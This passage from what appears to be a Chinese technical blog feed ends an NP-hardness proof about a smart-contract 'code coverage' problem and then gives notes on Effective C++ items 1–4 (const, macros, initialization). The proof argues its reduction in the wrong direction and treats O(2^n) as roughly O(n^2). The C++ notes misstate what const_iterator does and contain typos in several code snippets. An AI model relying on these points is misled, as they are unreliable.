$j$关联，所以元素$e$至少属于$C=i$或者$C=j$时对应的子集 $S_i$ 或$S_j$。所以有子集$C$覆盖$U$。</p><p>  设在集合覆盖问题中存在$k$个子集$C$使得 $⋃_i∈c , S_i=U$。由于每一个集合$S_i$ 都跟图中的一个顶点相关联，我们令 $W$ 是这些顶点的集合。所以 $W$ 中最多包含 $k$ 个元素。由于子集 $C$ 覆盖 $U$，所以对任意一条边 $e={i,j}$ 来说，至少存在一个子集 $S_j$ , $j=C$ 包含 $e$ ，因此必然存在顶点 $j∈W$ 覆盖 $e$。</p></li></ul><p>综上两个步骤的证明，集合覆盖问题的判定问题是NPC问题。从而求最小的集合覆盖问题是NP难的。</p><h1 id="3-证明代码覆盖问题是NP难问题"><a href="#3-证明代码覆盖问题是NP难问题" class="headerlink" title="3. 证明代码覆盖问题是NP难问题"></a>3. 证明代码覆盖问题是NP难问题</h1><h2 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h2><p>代码覆盖问题的一个实例：$⟨X,F⟩$ 由一个有限操作码集合 $X$ 和一个无穷大的子集族 $F$ 组成，代码覆盖问题就是要找出 $F$ 中的最小子集$C<em>$，使得$C</em>$中的个体所执行的操作码的集合 $D$ 能够覆盖 $X$  ，数学表示就是：</p><script type="math/tex; mode=display">|C∗|=min\{|C||C∈F⋀D覆盖X\}</script><h2 id="约束条件"><a href="#约束条件" class="headerlink" title="约束条件"></a>约束条件</h2><p>和集合覆盖中给出有限的子集族F不同，代码覆盖问题的子集族有无穷大的空间，即 $|F|-&gt;\inf$ ,并且有无数多个重复的代码子集。</p><h2 id="相关判定问题"><a href="#相关判定问题" class="headerlink" title="相关判定问题"></a>相关判定问题</h2><ul><li><p>代码覆盖的判定问题：<br>  给定一个包含 $n$ 个操作码的集合 $F$，一个由 $m$ 个子集 $H_i$ 构成的集合，其中每一个 $H_i$ 分别对应一个操作码$C_i \subseteq F$，以及再给定一个整数k，判定是否存在集合$C \subseteq {1,2,…,m},|C| \leq k$，使得相应的子集 $C_i$ 能够覆盖集合$F$，即</p><script type="math/tex; mode=display">\bigcup_{i \in C}{C_i} = F</script></li><li><p>集合覆盖的判定问题：<br>  给定一个包含 $n$ 个元素的集合 $U$；一个由 $m$ 个子集 $S_i⊆U$ 的构成的集合；以及一个整数 $k$。判定是否存在集合 $C \subseteq {1,2,…,m},|C| \leq k$ ，使得相应子集 $S_i$ 能够覆盖集合 $U$ 中的所有元素，即:</p><script type="math/tex; mode=display">\bigcup_{i \in C}{S_i} = U</script></li></ul><h2 id="证明-1"><a href="#证明-1" class="headerlink" title="证明"></a>证明</h2><ul><li><p>第一步，证明代码覆盖的判定问题是属于NP问题的</p><p>  对于任意给定的一个集合$C$，可以在多项式时间内检测出$C$中元素的个数是否超过k，也可以检验出这$C$中元素所相对应的操作码的集合$D$的并集是否覆盖了$F$中的所有元素，即证明代码覆盖的判定问题是属于NP问题的。</p></li><li><p>第二步，证明代码覆盖的判定问题能够归约到集合覆盖的问题上去</p><p>  任意给定代码覆盖问题的判定问题$⟨F,H⟩$，一个整数 $k$，根据如下规则生成一个对应的集合覆盖问题，令全集 $F = U$，集合$U$中的$n$个元素分别对应集合$F$中的$n$操作码，假设存在一个转换器，子集族 $H$ 中的各个元素$H_i$可以在多项式时间能各自生成一个操作码的集合$C_i$，这些集合合并成为一个集合族$C$，那么就可以在多项式时间内将一个代码覆盖问题转换成一个集合覆盖问题。</p><p>  接下来证明存在这样的转换器：<br>  对于任意子集族$H$中的元素$H_i$，$|C_i|$的生成和构成操作码集合$F$的算法有关，</p><ul><li><p>对于构成算法本身是多项式复杂度来说：既然可以在多项式时间复杂度内完成算法，自然可以在多项式时间复杂度内获得生成操作码的集合。</p></li><li><p>对于构成算法本身是非多项式时间复杂度的算法来说：由于智能合约的gas费限制：</p><ul><li>对于能在可接受时间内完成运行的算法来说，如$O(2^n)$等一些非多项式时间复杂度的算法，由于需要在一定时间内完成，那么$n$的值必然小，在这种情况下$O(2^n) \approx O(n^2)$，可以近似看为非多项式时间复杂度。</li><li>对于不能再一定时间内完成运行的算法来说，智能合约会产生回滚操作，所以可以忽略。</li></ul></li></ul></li><li><p>综上，可以证明代码覆盖问题的判定问题是NPC问题，从而求最小个体的代码覆盖问题是NP难问题。</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Effective C++ 笔记</title>
      <link href="/2022/09/21/Effective-C-%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/09/21/Effective-C-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="让自己习惯C"><a href="#让自己习惯C" class="headerlink" title="让自己习惯C++"></a>让自己习惯C++</h1><h2 id="条款1-将C-看作一个语言联邦"><a href="#条款1-将C-看作一个语言联邦" class="headerlink" title="条款1 将C++看作一个语言联邦"></a>条款1 将C++看作一个语言联邦</h2><p>早期的C++只是叫”C with classes”，但发展到今天已经成为一个多重泛型编程语言，有四种次语言：</p><ul><li>C</li><li>面向对象 C++ ，也就是 C with class</li><li>template C++ ，也就是C++的泛型编程，template metaprogramming（TMP，模板元编程）</li><li>STL。 template 程序库</li></ul><p>总结：C++高效编程守则视情况变化而变化，取决于使用C++的部分。</p><h2 id="条款2-尽量用const，enum，inline-替换-define"><a href="#条款2-尽量用const，enum，inline-替换-define" class="headerlink" title="条款2 尽量用const，enum，inline 替换 #define"></a>条款2 尽量用const，enum，inline 替换 #define</h2><p>也可以说是使用编译器替换预处理器</p><ol><li>例如：<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ASPECT</span> <span class="token expression"><span class="token number">1.653</span></span></span></code></pre> 在上面这个语句中，字符串’ASPECT’是不会被编译器看到的，而编译器看到的是’1.653’，这就会导致在调试过程中，编译器的错误信息只显示’1.653’而不是’ASPECT’，对调试造成问题。<br> 可以使用如下替换： <pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">double</span> Aspect <span class="token operator">=</span> <span class="token number">1.653</span><span class="token punctuation">;</span>  <span class="token comment">//由于大写名称通常使用于宏，所以 ASPECT->Aspect</span></code></pre></li><li><p>当定义或声明全局变量时，常数指针和类的常数需要另加考虑</p><ul><li><p>对于指针要把指针本身和它指向的数据都定义为const。<br>例如</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token keyword">const</span> myWord <span class="token operator">=</span> <span class="token string">"Hello"</span><span class="token punctuation">;</span></code></pre><p>在C++中可以更方便地使用std::string这样基于char*类型的推广，例如</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> std<span class="token operator">::</span>string <span class="token function">myWord</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>对于类的常数<br>为了将常量的作用域限制于class内，并且确保这个常量不会生成多个拷贝，可以声明为类的私有静态成员</p><pre class="language-c" data-language="c"><code class="language-c">class Player<span class="token punctuation">&#123;</span> private<span class="token operator">:</span>  <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">int</span> NumTurns <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span></code></pre><p>因为此处是类的成员声明范围内，所以上面只是变量的声明和初始化，而并非定义，因此如果想获取变量的地址，需要在别处另加定义。这个定义不能有任何赋值语句，因为在类内已经规定为const:</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">int</span> Player<span class="token operator">::</span>numPlayer<span class="token punctuation">;</span></code></pre></li></ul></li><li><p>枚举技巧<br>假设存在这么一种情况：需要在一个类内声明某变量，但你的编译器不允许在声明时赋值初始化，同时接下来的某个语句却需要用到这个变量的具体数值，如：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> noPlayer<span class="token punctuation">;</span><span class="token keyword">int</span> scores<span class="token punctuation">[</span>noPlayer<span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>这个时候编译器会报错，可以使用以下方式解决：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">enum</span> <span class="token punctuation">&#123;</span>noPlayer <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> scores<span class="token punctuation">[</span>noPlayer<span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>但注意enum类型在内存中没有实体，无法取得enum类型的地址，因此这个方法更相当于取一个本地的#define数值</p></li><li><p>对于#define的宏函数，尽量使用inline修饰的函数来代替#define<br>inline关键字用来建议编译器把某频繁调用的函数当做内联函数，即在每次函数调用时，直接把函数代码放在函数调用语句的地址，减少堆栈浪费。<br>如果为了减少堆栈资源的使用，把某个频繁调用的函数规定为宏，例如用a和b的最大值来调用某函数f:</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">CALL_MAX</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span></code></pre><p>但是这样会产生一个新问题</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> b<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token function">CALL_MAX</span><span class="token punctuation">(</span><span class="token operator">++</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">//a增加了一次</span><span class="token function">CALL_MAX</span><span class="token punctuation">(</span><span class="token operator">++</span>a<span class="token punctuation">,</span> b<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//a增加了两次 </span></code></pre><p>解决方法：</p><pre class="language-c" data-language="c"><code class="language-c">template<span class="token operator">&lt;</span>typename T<span class="token operator">></span><span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">callMax</span><span class="token punctuation">(</span><span class="token keyword">const</span> T<span class="token operator">&amp;</span> a<span class="token punctuation">,</span> <span class="token keyword">const</span> T<span class="token operator">&amp;</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">f</span><span class="token punctuation">(</span>a <span class="token operator">></span> b <span class="token operator">?</span> a <span class="token operator">:</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h2 id="条款3-多用const"><a href="#条款3-多用const" class="headerlink" title="条款3 多用const"></a>条款3 多用const</h2><ol><li><p>如果要定义某指针或数据为常量不允许改变</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>  <span class="token comment">//数据是const ，数据不允许被改变</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token keyword">const</span> p<span class="token punctuation">;</span>  <span class="token comment">//指针是const , 指针不允许被改变</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token keyword">const</span> <span class="token keyword">const</span> p<span class="token punctuation">;</span> <span class="token comment">//数据和指针都是const，都不可以被改变</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">;</span>  <span class="token comment">//都表示指向常量char的指针</span><span class="token keyword">char</span> cosnt <span class="token operator">*</span>p<span class="token punctuation">;</span> </code></pre><p>const 在*号左边修饰数据，const在星号右边修饰指针</p></li><li><p>迭代器与const<br>迭代器在功能上相当于指向某类型T的指针T*</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>iterator it <span class="token operator">=</span> v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//表示迭代器本身是常量</span><span class="token operator">*</span>it <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">//编译通过，迭代器是常量，但是数据可以被修改</span><span class="token operator">++</span>it<span class="token punctuation">;</span>   <span class="token comment">//编译失败！因为const迭代器不允许被改变！</span></code></pre><p>如果要更改数据，使用const_iterator</p><pre class="language-c" data-language="c"><code class="language-c">std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>const_iterator it <span class="token operator">=</span> v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//无法使用，待解决TODO</span></code></pre></li><li><p>尽量使用const可以帮助调试<br>假设存在</p><pre class="language-c" data-language="c"><code class="language-c">class Rational<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Rational operator<span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> Rational<span class="token operator">&amp;</span> lhs<span class="token punctuation">,</span> <span class="token keyword">const</span> Rational<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span></code></pre><p>在某处使用此乘法操作符，误把比较操作符“==”打成了赋值操作符 “=” ：</p><pre class="language-c" data-language="c"><code class="language-c">Rational a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">*</span> b <span class="token operator">=</span> c<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>      </code></pre><p>但编译器在此并不会报错，因为只有当a,b,c是C++自有类型(比如int)才会报错，对于用户自定义的类，编译器会认为此操作是将一个Rational赋值给另一个Rational<br>如果将该操作符定义为返回const，这样赋值将会是非法操作。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> Rational operator<span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> Rational<span class="token operator">&amp;</span> lhs<span class="token punctuation">,</span> <span class="token keyword">const</span> Rational<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>类的成员函数与const<br>给成员函数使用const关键字是非常重要的，它可以让接口更加直观，直接告诉用户这个函数是不是只读(Read only)，会不会改变某变量。</p></li><li><p>成员函数的常量性<br>C++标准对成员函数”常量性”的规定是数据常量性(bitwise constness)，即不允许常量对象的成员数据被修改。C++编译器对此的检测也十分简单粗暴，只检查该成员函数有没有给成员数据的赋值操作。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> Text <span class="token function">ct</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//构造某常量对象</span><span class="token keyword">char</span><span class="token operator">*</span> pc <span class="token operator">=</span> <span class="token operator">&amp;</span>ct<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token comment">//取其指针</span><span class="token operator">*</span>pc <span class="token operator">=</span> <span class="token char">'K'</span><span class="token punctuation">;</span>                     <span class="token comment">//通过指针修改常量对象，编译不会报错，结果为"Kello"</span></code></pre><p>还有另一个局限性，例如：</p><pre class="language-c" data-language="c"><code class="language-c">class Text<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    std<span class="token operator">::</span><span class="token class-name">sizt_t</span> <span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">;</span>  private<span class="token operator">:</span>    <span class="token keyword">char</span><span class="token operator">*</span> pText<span class="token punctuation">;</span>    std<span class="token operator">::</span><span class="token class-name">size_t</span> length<span class="token punctuation">;</span>    bool lengthValid<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>std<span class="token operator">::</span><span class="token class-name">size_t</span> Text<span class="token operator">::</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>lengthValid<span class="token punctuation">)</span>           <span class="token comment">//做某些错误检测</span>  <span class="token punctuation">&#123;</span>    length <span class="token operator">=</span> std<span class="token operator">::</span><span class="token function">strlen</span><span class="token punctuation">(</span>pText<span class="token punctuation">)</span><span class="token punctuation">;</span>             lengthValid <span class="token operator">=</span> true<span class="token punctuation">;</span>                     <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> length<span class="token punctuation">;</span>             <span class="token comment">//这行才是代码核心</span><span class="token punctuation">&#125;</span></code></pre><p>在这段代码中，length()函数要做某些错误检测，因此可能会修改成员数据。即使真正的功能核心只是返回字符长度，编译器依然认为你可能会修改某些成员数据而报错。因此，更好的方法是逻辑常量性(Logical constness)，即允许某些数据被修改，只要这些改动不会反映在外，例如，以上问题可以用mutable关键字来解决:</p><pre class="language-c" data-language="c"><code class="language-c">mutable std<span class="token operator">::</span><span class="token class-name">size_t</span> length<span class="token punctuation">;</span>mutable bool lengthValid<span class="token punctuation">;</span></code></pre></li><li>在定义常量与非常量成员函数时，避免代码重复<br>其实在这里指的是函数的实现要避免重复。试想某函数既要检查边界范围，又要记录读取历史，还要检查数据完整性，这样的代码复制一遍，既不显得美观，又增加了代码维护的难度和编译时间。因此，可以使用非常量的函数来调用常量函数。<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">&amp;</span> operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>std<span class="token operator">::</span><span class="token class-name">size_t</span> pos<span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span><span class="token operator">&amp;</span> operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>std<span class="token operator">::</span><span class="token class-name">size_t</span> pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span>    const_cast<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&amp;</span><span class="token operator">></span><span class="token punctuation">(</span>                              <span class="token comment">//const_cast去掉const关键字，并转换为char&amp;</span>      static_cast<span class="token operator">&lt;</span><span class="token keyword">const</span> Text<span class="token operator">&amp;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token operator">*</span>this<span class="token punctuation">)</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//给当前变量加上const关键字，才可以调用const操作符</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>为了避免无限递归调用当前非常量的操作符，可以需要将(*this)转换为const Text&amp;类型才能保证安全调用const的操作符，最后去掉const关键字再将其返回，巧妙避免了代码的大段复制。<br>但注意，如果使用相反的方法，用const函数来调用non-const函数，就可能会有未知结果，因为这样相当于non-const函数接触到了const对象的数据，就可能导致常量数据被改变。</li></ol><p>总结：</p><ul><li><p>指针，迭代器，引用，本地变量，全局变量，成员函数，返回值都可以使用const来实现数据只读的目的，const是C++一个非常强大的特性。</p></li><li><p>除此之外，它还能帮助加快调试过程</p></li><li><p>即使编译器使用数据常量性的标准，可以编程的时候应该采用逻辑常量性，对相关不可避免更改的成员数据加上mutable关键字来修饰</p></li><li><p>当有大段复制代码出现在const和non-const的成员函数中，可以使用non-const函数来调用const函数来避免复制。</p></li></ul><h2 id="条款4-确定对象被使用前已经被初始化"><a href="#条款4-确定对象被使用前已经被初始化" class="headerlink" title="条款4 确定对象被使用前已经被初始化"></a>条款4 确定对象被使用前已经被初始化</h2><p>C++并不能保证每个对象在定义时都被自动初始化。就像书中第一条提到的一样，C++包含多种子语言，例如定义一个C风格的整型数组(int[])时，其中就可能包含非零初始化的元素。到那时STL中的容器所有元素都是被0初始化的（默认条件）。</p><ol><li><p>自有类型(built-in type)的初始化<br>C++的自有类型继承于C，因此不能保证此类型的变量在定义时被初始化。使用未初始化的数据可能会导致程序不正常运作，因此在定义变量的时候，需要对其进行初始化。</p></li><li><p>类的初始化<br>对于用户自定义的类，可以需要构造函数(constructor)来完成此类的初始化<br>例如：</p><pre class="language-c" data-language="c"><code class="language-c">class PhoneNumber <span class="token punctuation">&#123;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class ABEntry<span class="token punctuation">&#123;</span> <span class="token comment">// ABEntry = “Address Book Entry”</span>public<span class="token operator">:</span>    <span class="token function">ABEntry</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string <span class="token operator">&amp;</span>name<span class="token punctuation">,</span> <span class="token keyword">const</span> std<span class="token operator">::</span>string <span class="token operator">&amp;</span>address<span class="token punctuation">,</span>            <span class="token keyword">const</span> std<span class="token operator">::</span>list<span class="token operator">&lt;</span>PhoneNumber<span class="token operator">></span> <span class="token operator">&amp;</span>phones<span class="token punctuation">)</span><span class="token punctuation">;</span>private<span class="token operator">:</span>    std<span class="token operator">::</span>string theName<span class="token punctuation">;</span>    std<span class="token operator">::</span>string theAddress<span class="token punctuation">;</span>    std<span class="token operator">::</span>list<span class="token operator">&lt;</span>PhoneNumber<span class="token operator">></span> thePhones<span class="token punctuation">;</span>    <span class="token keyword">int</span> numTimesConsulted<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>ABEntry<span class="token operator">::</span><span class="token function">ABEntry</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string <span class="token operator">&amp;</span>name<span class="token punctuation">,</span> <span class="token keyword">const</span> std<span class="token operator">::</span>string <span class="token operator">&amp;</span>address<span class="token punctuation">,</span>                 <span class="token keyword">const</span> std<span class="token operator">::</span>list<span class="token operator">&lt;</span>PhoneNumber<span class="token operator">></span> <span class="token operator">&amp;</span>phones<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    theName <span class="token operator">=</span> name<span class="token punctuation">;</span>       <span class="token comment">// these are all assignments,</span>    theAddress <span class="token operator">=</span> address<span class="token punctuation">;</span> <span class="token comment">// not initializations</span>    thePhones <span class="token operator">=</span> phones<span class="token punctuation">;</span>    numTimesConsulted <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>这是个易于记忆的方法，但不是最好的方法。因为此构造函数并没有真正完成“初始化”，只不过是做了“赋值”的操作。C++规定，对象的成员变量的初始化动作发生在进入构造函数本体之前。也就是初始化的发生时间在这些成员的default构造函数被调用之时（比进入构造函数本体的时间更早）。<br>描写构造函数可以有更好的方法：</p><pre class="language-c" data-language="c"><code class="language-c">ABEntry<span class="token operator">::</span><span class="token function">ABEntry</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string <span class="token operator">&amp;</span>name<span class="token punctuation">,</span> <span class="token keyword">const</span> std<span class="token operator">::</span>string <span class="token operator">&amp;</span>address<span class="token punctuation">,</span>                 <span class="token keyword">const</span> std<span class="token operator">::</span>list<span class="token operator">&lt;</span>PhoneNumber<span class="token operator">></span> <span class="token operator">&amp;</span>phones<span class="token punctuation">)</span>    <span class="token operator">:</span> <span class="token function">theName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token function">theAddress</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// these are now all initializations</span>      <span class="token function">thePhones</span><span class="token punctuation">(</span>phones<span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token function">numTimesConsulted</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> </code></pre></li><li><p>有些初始化是必要的<br>例如在定义引用(reference)和常量(const)时，不将其初始化会导致编译器报错。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">int</span> a<span class="token punctuation">;</span>                <span class="token comment">//报错，需要初始化！</span><span class="token keyword">int</span><span class="token operator">&amp;</span> b<span class="token punctuation">;</span>                     <span class="token comment">//报错，需要初始化！</span><span class="token comment">//现在对其进行初始化：</span><span class="token keyword">const</span> <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token comment">//编译通过</span><span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token operator">&amp;</span> b <span class="token operator">=</span> c<span class="token punctuation">;</span>                 <span class="token comment">//编译通过！</span></code></pre><p>最省力的方法就是总是初始化，并且使用初值列初始化，省力又高效。</p></li><li><p>初始化的顺序<br>在继承关系中，基类(base class)总是先被初始化。</p></li></ol><p>在同一类中，成员数据的初始化顺序与其声明顺序是一致的，而不是初始化列表的顺序。因此，为了代码一致性，要保证初始化列表的顺序与成员数据声明的顺序是一样的。</p><pre class="language-c" data-language="c"><code class="language-c">class myClass<span class="token punctuation">&#123;</span>  private<span class="token operator">:</span>    <span class="token keyword">int</span> a<span class="token punctuation">;</span>    <span class="token keyword">int</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> c<span class="token punctuation">;</span>  public<span class="token operator">:</span>    <span class="token function">myClass</span><span class="token punctuation">(</span><span class="token keyword">int</span> _a<span class="token punctuation">,</span> <span class="token keyword">int</span> _b<span class="token punctuation">,</span> <span class="token keyword">int</span> _c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//即使初始化列表是c->a->b的顺序，真正的初始化顺序还是按照a->b->c</span>myClass<span class="token operator">::</span><span class="token function">myClass</span><span class="token punctuation">(</span><span class="token keyword">int</span> _a<span class="token punctuation">,</span> <span class="token keyword">int</span> _b<span class="token punctuation">,</span> <span class="token keyword">int</span> _c<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token function">c</span><span class="token punctuation">(</span>_c<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">a</span><span class="token punctuation">(</span>_a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">b</span><span class="token punctuation">(</span>_b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></code></pre><ol><li>初始化非本地静态对象<br>在两个编译单元中，分别包含至少一个非本地静态对象，当这些对象发生互动时，它们的初始化顺序是不确定的，所以直接使用这些变量，就会给程序的运行带来风险。</li></ol><ul><li>编译单元：可以让编译器生成代码的基本单元，一般一个源代码文件就是一个编译单元。</li><li>非本地静态对象(non-local static object): 静态对象可以是在全局范围定义的变量，在名空间范围定义的变量，函数范围内定义为static的变量，类的范围内定义为static的变量，而除了函数中的静态对象是本地的，其他都是非本地的。静态对象存在于程序的开始到结束，所以它不是基于堆(heap)或者栈(stack)的。初始化的静态对象存在于.data中，未初始化的则存在于.bss中。<br>存在以下服务端代码和客户端代码<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//服务端</span>class Server<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>     <span class="token keyword">extern</span> Server server<span class="token punctuation">;</span>                 <span class="token comment">//在全局范围声明外部对象server，供外部使用</span><span class="token comment">//客户端</span>class Client<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Client<span class="token operator">::</span><span class="token function">Client</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    number <span class="token operator">=</span> server<span class="token punctuation">.</span>number<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>Client client<span class="token punctuation">;</span>                       <span class="token comment">//在全局范围定义client对象，自动调用了Client类的构造函数</span></code></pre>以上问题在于，定义对象client自动调用了client类的构造函数，此时需要读取对象server的数据，但全局变量的不可控性让可以不能保证对象server在此时被读取时是初始化的。试想如果还有对象client1, client2等等不同的用户读写，可以不能保证当前server的数据是可以想要的。<br>解决方法: 